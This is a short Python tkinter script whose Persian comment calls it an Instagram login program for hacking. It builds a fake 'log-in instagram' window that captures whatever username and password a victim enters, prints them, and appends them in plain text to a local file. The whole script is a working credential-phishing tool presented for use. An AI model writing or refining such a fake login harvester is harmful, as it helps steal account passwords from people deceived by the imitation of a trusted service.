from tkinter import *
from colorama import Fore
#ساخت برنامه لاگین اینستاگرام و هک ان

def get():
    print(Fore.GREEN,'Saved login !',Fore.RESET)
    print(Fore.YELLOW,"Username is: ",Fore.RESET + f"{user.get()}\t" + Fore.YELLOW,"Password is: ",Fore.RESET + f"{password.get()}")
    with open('user1.txt','a') as file:
        file.write(f'username : {user.get()}\t password : {password.get()}\n')
x = Tk()
x.title("Mr Python")
Label(x,text="log-in instagram").pack()
Label(x,text="Username: ").pack()
user = Entry(x)
user.pack()
Label(x,text="Password: ").pack()
password = Entry(x)
password.pack()
Button(x,text="login",command=get).pack()

x.geometry("400x300")
x.mainloop()